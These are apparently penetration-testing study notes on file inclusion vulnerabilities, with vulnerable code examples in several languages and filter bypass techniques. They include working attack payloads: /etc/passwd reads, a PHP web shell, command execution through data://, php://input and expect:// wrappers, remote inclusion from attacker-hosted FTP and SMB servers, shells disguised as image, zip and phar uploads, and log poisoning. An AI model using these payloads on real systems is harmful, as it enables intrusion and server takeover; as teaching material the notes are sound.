Many modern back-end languages, such as PHP, Javascript, or Java, use HTTP parameters to specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (LFI) vulnerability.

The most common place we usually find LFI within is templating engines. In order to have most of the web application looking the same when navigating between pages, a templating engine displays a page that shows the common static parts, such as the header, navigation bar, and footer, and then dynamically loads other content that changes between pages. Otherwise, every page on the server would need to be modified when changes are made to any of the static parts. This is why we often see a parameter like /index.php?page=about, where index.php sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called about.php. As we have control over the about portion of the request, it may be possible to have the web application grab other files and display them on the page.

# Example in PHP

In PHP, we may use the **include() function** to load a local or a remote file as we load a page. If the path passed to the include() is taken from a user-controlled parameter, like a GET parameter, and the code does not explicitly filter and sanitize the user input, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

We see that the language parameter is directly passed to the include() function. So, any path we pass in the language parameter will be loaded on the page, including any local files on the back-end server. This is not exclusive to the include() function, as there are many other PHP functions that would lead to the same vulnerability if we had control over the path passed into them.
Such functions include:
- include_once();
- require();
- require_once();
- file_get_contents().

# Example in NodeJS

Just as the case with PHP, NodeJS web servers may also load content based on an HTTP parameters. The following is a basic example of how a GET parameter language is used to control what data is written to a page:

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

As we can see, whatever parameter passed from the URL gets used by the readfile function, which then writes the file content in the HTTP response. Another example is the **render() function** in the Express.js framework.

The following example shows uses the language parameter to determine which directory it should pull the about.html page from:

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```
Unlike our earlier examples where GET parameters were specified after a (?) character in the URL, the above example takes the parameter from the URL path (e.g. /about/en or /about/es). As the parameter is directly used within the render() function to specify the rendered file, we can change the URL to show a different file instead.

# Example in Java

The same concept applies to many other web servers. The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the include function:

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

The **include function** may take a file or a page URL as its argument and then renders the object into the front-end template, similar to the ones we saw earlier with NodeJS.
The **import function** may also be used to render a local file or a URL, such as the following example:

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

# Example in .NET

Finally, let's take an example of how File Inclusion vulnerabilities may occur in .NET web applications. **The Response.WriteFile function** works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a GET parameter for dynamic content loading, as follows:

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

Furthermore, **the @Html.Partial() function** may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

Finally, the include function may be used to render local files or remote URLs, and may also execute the specified files as well:

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

# Read vs execute

The most important thing to keep in mind is that some of the above functions only read the content of the specified files, while others also execute the specified files. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.

The following table shows which functions may execute files and which only read file content:

|Function|Read content|Execute|Remote URL|
| :----: |   :----:   | :----:|  :----:  |
**PHP**
|include()/include_once()|Yes|Yes|Yes|
|require()/require_once()|Yes|Yes|No|
|file_get_contents()|Yes|No|Yes|
|fopen()/file()|Yes|No|No|
**NodeJS**
|fs.readFile()|Yes|No|No|
|fs.sendFile()|Yes|No|No|
|res.render()|Yes|Yes|No|
**Java**
|include|Yes|No|No|
|import|Yes|Yes|Yes|
**.NET**
|@Html.Partial()|Yes|No|No|
|@Html.RemotePartial()|Yes|No|Yes|
|Response.WriteFile()|Yes|No|No|
|include|Yes|Yes|Yes|


**This is a significant difference to note, as executing files may allow us to execute functions and eventually lead to code execution, while only reading the file's content would only let us to read the source code without code execution**.

### Local file inclusion (LFI)

We can try to use multiple different functions to read a local file. Whether a payload will work depends on the XSLT version and the configuration of the XSLT library. For instance, XSLT contains a function unparsed-text that can be used to read a local file:

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

However, it was only introduced in XSLT version 2.0. However, if the XSLT library is configured to support PHP functions, we can call the PHP function file_get_contents using the following XSLT element:

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

### Remote code execution (RCE)

If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function system to execute a command:

```xml
<xsl:value-of select="php:function('system','id')" />
```

# Path traversal

In the earlier example, we read a file by specifying its absolute path (e.g. /etc/passwd). This would work if the whole input was used within the include() function without any additions, like the following example:

```php
include($_GET['language']);
```

In this case, if we try to read /etc/passwd, then the include() function would fetch that file directly.

However, in many occasions, web developers may append or prepend a string to the language parameter. For example, the language parameter may be used for the filename, and may be added after a directory, as follows:

```php
include("./languages/" . $_GET['language']);
```

In this case, if we attempt to read /etc/passwd, then the path **passed to include() would be (./languages//etc/passwd)**, and as this file does not exist, we will not be able to read anything:

We can easily bypass this restriction by traversing directories using relative paths. To do so, we can add ../ before our file name, which refers to the parent directory. For example, if the full path of the languages directory is /var/www/html/languages/, then using ../index.php would refer to the index.php file on the parent directory (i.e. /var/www/html/index.php).

So, we can use this trick to go back several directories until we reach the root path (i.e. /), and then specify our absolute file path **(e.g. ../../../../etc/passwd)**, and the file should exist.

# Filename prefix

In our previous example, we used the language parameter after the directory, so we could traverse the path to read the passwd file. On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:

```php
include("lang_" . $_GET['language']);
```

In this case, if we try to traverse the directory with **../../../etc/passwd, the final string would be lang_../../../etc/passwd**, which is invalid.

As expected, the error tells us that this file does not exist. so, instead of directly using path traversal, **we can prefix a / before our payload**, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories.

**Note**: This may not always work, as in this example a directory named lang_/ may not exist, so our relative path may not be correct. Furthermore, any prefix appended to our input may break some file inclusion techniques we will discuss in upcoming sections, like using PHP wrappers and filters or RFI.

# Appended extension

Another very common example is when an extension is appended to the language parameter, as follows:

```php
include($_GET['language'] . ".php");
```

This is quite common, as in this case, we would not have to write the extension every time we need to change the language. This may also be safer as it may restrict us to only including PHP files. In this case, if we try to read /etc/passwd, then the file included would be /etc/passwd.php, which does not exist.

# Second order attacks

As we can see, LFI attacks can come in different shapes. Another common, and a little bit more advanced, LFI attack is a Second Order Attack. This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.

**For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png)**. If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). **This is why this attack is called a Second-Order attack**.

Developers often overlook these vulnerabilities, as they may protect against direct user input (e.g. from a ?page parameter), but they may trust values pulled from their database, like our username in this case. If we managed to poison our username during our registration, then the attack would be possible.


# Basic bypass

In the previous section, we saw several types of attacks that we can use for different types of LFI vulnerabilities. In many cases, we may be facing a web application that applies various protections against file inclusion, so our normal LFI payloads would not work. Still, unless the web application is properly secured against malicious LFI user input, we may be able to bypass the protections in place and reach file inclusion.

### Non-recursive path traversal filters

One of the most **basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals**. For example:

```php
$language = str_replace('../', '', $_GET['language']);
```

We see that all ../ substrings were removed, which resulted in a final path being ./languages/etc/passwd. However, this filter is very insecure, as it is not recursively removing the ../ substring, as it runs a single time on the input string and does not apply the filter on the output string. **For example, if we use ....// as our payload, then the filter would remove ../ and the output string would be ../, which means we may still perform path traversal**.

**The ....// substring is not the only bypass we can use, as we may use ..././ or ....\/ and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. ....\/), or adding extra forward slashes (e.g. ....////)**.

### Encoding

Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function.
Core **PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass**, but even on newer versions we may find custom filters that may be bypassed through URL encoding.
If the target web application **did not allow . and / in our input, we can URL encode ../ into %2e%2e%2f**, which may bypass the filter.

**Note**: For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.

Furthermore, we may also use Burp Decoder to encode the encoded string once again to have a double encoded string, which may also bypass other types of filters.

### Approved paths

Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the ./languages directory, as follows:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match. To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify.

### Appended extension evasion abusing path truncation

As discussed in the previous section, some web applications append an extension to our input string (e.g. .php), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).

There are a couple of other techniques we may use, but **they are obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4**. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.

\
\
In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd).

PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. **Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work**.

```
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Of course, we don't have to manually type ./ 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

### Appended extension evasion abusing NULL bytes

**PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string** and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

To exploit this vulnerability, we can end our payload with a null byte **(e.g. /etc/passwd%00)**, such that the final path passed to include() would be (/etc/passwd%00.php). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.

<br>
<br>
<br>
<br>

# PHP filters

Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.

**PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams**. This has a lot of uses for PHP developers. Still, as web penetration testers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. This is not only beneficial with LFI attacks, but also with other web attacks like XXE.

### Input filters

To use PHP wrapper streams, **we can use the php:// scheme** in our string, and we can access the PHP filter wrapper with **php://filter/**.

The filter wrapper has several parameters, but**the main ones we require for our attack are resource and read**. **The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file)**, while **the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource**.

There are four different types of filters available for use:
- String filters;
- Conversion filters;
- Compression filters;
- Encryption filters.

### Fuzzing for PHP files

The first step would be to fuzz for different available PHP pages with a tool like ffuf or gobuster:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

### Standard PHP inclusion

If you tried to include any php files through LFI, you would have noticed that the included PHP file gets executed, and eventually gets rendered as a normal HTML page.

This may be useful in certain cases, like accessing local PHP pages we do not have access over (i.e. SSRF), but in most cases, we would be more interested in reading the PHP source code through LFI, as source codes tend to reveal important information about the web application. This is where the base64 php filter gets useful, as we can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered. This is especially useful for cases where we are dealing with LFI with appended PHP extensions, because we may be restricted to including PHP files only.

### Source code disclosure

Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the base64 PHP filter. Let's try to read the source code of config.php using the base64 filter, by specifying convert.base64-encode for the read parameter and config for the resource parameter, as follows:

```
php://filter/read=convert.base64-encode/resource=config
```

**Note**: We intentionally left the resource file at the end of our string, as the .php extension is automatically appended to the end of our input string, which would make the resource we specified be config.php.

Example of attack:

```
83.136.254.158:33186/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

<br>
<br>
<br>
<br>

# PHP wrappers for remote code execution (RCE)

One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file like config.php, which may match a user's password in case they re-use the same password. Or we can check the .ssh directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (id_rsa) and use it to SSH into the system.

Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications.

### Data wrapper

The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if **the (allow_url_include) setting is enabled in the PHP configurations**. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

### Checking PHP configurations

To do so, we can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"


<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value:

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value.

Knowing how to check for the allow_url_include option can be very important, as this option is not enabled by default, and is required for several other LFI attacks, like using the input wrapper or for any RFI attack, as we'll see next. **It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example**.

**With allow_url_include enabled, we can proceed with our data wrapper attack. As mentioned earlier, the data wrapper can be used to include external data, including PHP code. We can also pass it base64 encoded strings with text/plain;base64, and it has the ability to decode them and execute the PHP code**.

So, our first step would be to base64 encode a basic PHP web shell, as follows:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with ```data://text/plain;base64,```. Finally, we can use pass commands to the web shell with ```&cmd=<COMMAND>```.

We may also use cURL for the same attack, as follows:

```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid 


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Input wrapper

Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. **The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data**.

So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentioned earlier.

To repeat our earlier attack but with the input wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid



uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


**Note**: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)

### Expect wrapper

Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but **don't need to provide a web shell, as it is designed to execute commands**.

However, expect is an external wrapper, **so it needs to be manually installed and enabled on the back-end server**, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following:

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

extension=expect
```

As we can see, the extension configuration keyword is used to enable the expect module, which means we should be able to use it for gaining RCE through the LFI vulnerability. 

To use the expect module, we can use the expect:// wrapper and then pass the command we want to execute, as follows:

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, executing commands through the expect module is fairly straightforward, as this module was designed for command execution, as mentioned earlier.

<br>
<br>
<br>
<br>

# Remote file inclusion (RFI)

In some cases, we may also be able to include remote files "Remote File Inclusion (RFI)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

1. Enumerating local-only ports and web applications (i.e. SSRF);
2. Gaining remote code execution by including a malicious script that we host.

This fucntions, if vulnerable, would allow RFI:

|Function|Read content|Execute|Remote URL|
| :----: |   :----:   | :----:|  :----:  |
**PHP**
|include()/include_once()|Yes|Yes|Yes|
|file_get_contents()|Yes|No|Yes|
**Java**
|import|Yes|Yes|Yes|
**.NET**
|@Html.RemotePartial()|Yes|No|Yes|
|include|Yes|Yes|Yes|

As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
1. The vulnerable function may not allow including remote URLs;
2. You may only control a portion of the filename and not the entire protocol wrapper (ex: http://, ftp://, https://);
3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.


Furthermore, as we may note in the above table, **some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF**.

### Verify RFI

In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, **any remote URL inclusion in PHP would require the allow_url_include setting to be enabled**. We can check whether this setting is enabled through LFI, as we did in the previous section.

However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI **is to try and include a URL, and see if we can get its content**. At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (**http://127.0.0.1:80/index.php**) as our input string and see if it gets included:
```url
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

### Remote code execution with RFI

The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now, all we need to do is host this script and include it through the RFI vulnerability. **It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections**.

### FTP

We may also host our script through the FTP protocol. We can start a basic FTP server with Python's pyftpdlib, as follows:

```bash
sudo python -m pyftpdlib -p 21
```

This may also be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the ftp:// scheme in the URL, as follows:

```url
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

As we can see, this worked very similarly to our http attack, and the command was executed. By default, **PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL**, as follows:

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'


...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# SMB

If the vulnerable web application is **hosted on a Windows server (which we can tell from the server version in the HTTP response headers)**, then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion.

This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default, as follows:

```bash
impacket-smbserver -smb2support share $(pwd)


Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now, we can include our script by using a UNC path (e.g. \\<OUR_IP>\share\shell.php), and specify the command with (&cmd=whoami) as we did earlier:

```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, **we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations**.

<br>
<br>
<br>
<br>

# File upload to execute code (LFI and RCE)

File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability.

The File Upload Attacks module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files.

For the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, **we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution**.

### Image upload

Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well. We can do so as follows:

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.

Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file.

In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. **In our case, if we inspect the source code after uploading the image, we can get its URL**:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows:

```url
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

**Probably, you need to remove the GIF8 string which appears before the PHP shell**.


### ZIP upload

There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.

We can utilize the zip wrapper to execute PHP code. **However, this wrapper isn't enabled by default, so this method may not always work**. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named shell.jpg), as follows:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Once we upload the shell.jpg archive, we can include it with the zip wrapper as (zip://shell.jpg), and then refer to any files within it with #shell.php (URL encoded). Finally, we can execute commands as we always do with &cmd=id, as follows:

```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Phar upload

Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a phar file called shell.jpg. Once we upload it to the web application, we can simply call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&cmd=id), as follows:

```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

<br>
<br>
<br>
<br>

# LOG poisoning

We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the Execute privileges.

The attacks we will discuss in this section all rely on the same concept: **Writing PHP code in a field we control that gets logged into a log file** (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

### PHP session poisoning

Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in **/var/lib/php/sessions/ on Linux** and in **C:\\Windows\\Temp\\ on Windows**.

The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the **PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3**.

The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a PHPSESSID cookie set to our session:

For example, our PHPSESSID cookie value is nhhv8i0o6ua4g88bkdl9u1fdsd, so it should be stored at /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd. Let's try include this session file through the LFI vulnerability and view its contents:

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

We can see that **the session file contains two values**: page, which shows the selected language page, and preference, which shows the selected language. The preference value is not under our control, as we did not specify it anywhere and must be automatically specified. However, **the page value is under our control, as we can control it through the ?language= parameter**.

Let's try setting the value of page a custom value (e.g. language parameter) and see if it changes in the session file. We can do so by simply visiting the page with **?language=session_poisoning** specified, as follows:

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now, let's include the session file once again to look at the contents:

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

This time, the session file contains session_poisoning instead of es.php, which confirms our ability to control the value of page in the session file. Our next step is to perform the poisoning step by writing PHP code to the session file. **We can write a basic PHP web shell by changing the ?language= parameter to a URL encoded web shell, as follows**:

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the &cmd=id to execute a commands:

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

**Note**: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.


### Server log poisoning

Both Apache and Nginx maintain various log files, such as **access.log** and **error.log**.

The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above. 

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.

By default, Apache logs are located in **/var/log/apache2/** on Linux and in **C:\\xampp\\apache\\logs** on Windows, while Nginx logs are located in **/var/log/nginx/** on Linux and in **C:\\nginx\\log\\** on Windows.

However, the logs may be in a different location in some cases, so we may use an **LFI Wordlist to fuzz** for their locations, as will be discussed in the next section.

So, let's try including the Apache access log from /var/log/apache2/access.log, and see what we get:

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

For example, the log contains the remote IP address, request page, response code, and the User-Agent header. As mentioned earlier, the User-Agent header is controlled by us through the HTTP request headers, so we should be able to poison this value.

**Tip**: Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

To do so, we will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to the string "Apache Log Poisoning".
